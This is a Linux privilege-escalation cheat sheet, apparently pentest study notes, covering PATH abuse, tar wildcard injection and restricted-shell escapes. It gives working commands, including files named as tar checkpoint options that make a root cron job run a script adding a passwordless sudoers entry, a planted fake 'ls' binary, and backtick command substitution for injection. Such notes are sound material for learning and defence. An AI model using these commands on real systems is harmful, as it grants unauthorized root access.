## -Path Abuse-

| **Command**                                          | **Description**                                                       |

| `PATH=.:${PATH} && export PATH && echo $PATH`        | Add the '.' current dir to user's PATH to abuse PATH                  |
| `touch ls && echo 'echo "TEST"' > ls && chmod +x ls` | Example of how path abuse can be used if current dir is added to PATH |

## -Wildcard Abuse-

This attack is based on the environment available. An example of this type of attack follows:

Take the following vulnerable cron job on the victim's system:

```
#
#
mh dom mon dow command
*/01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *
```

The wildcard in the cronjob can be abused when the attacker commands are written as file names. This causes the cronjob to run the attacker commands:

```
user@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
user@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
user@NIX02:~$ echo "" > --checkpoint=1
```

## -Escaping Restricted Shells-

**Types of restricted shells**
[Restricted Bourne shell (rbash)](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html) | [Restricted Korn shell (rksh)](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command) | [Restricted Z shell (rzsh)](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)

When in a restricted shell there will be a pre-defined set of actions that is allowed. The first step in escaping is determining the capabilities of the shell.

Take the example scenario where the restricted shell only allows `ls -l` or `ls -a` to be run. In this case command injection may be possible to escape the shell by injecting additional commands into the args of the ls command.

```
Anon4Now@NIX[/home]$ ls -l `pwd`
```

This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd command. Since the pwd command is not restricted by the shell, this would allow for the execution of the pwd command and seeing the current working directory, even though the shell does not allow us to execute the pwd command directly.

Other possible techniques:

- Command Substitution: This involves using the shell's command substitution syntax to execute a command.
- Command Chaining: Use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a vertical bar (|), to execute a command.
- Environment Variables: Modifying or creating environment variables that the shell uses to execute commands that are not restricted by the shell.
- Shell Functions: Define and call shell functions that execute commands not restricted by the shell.
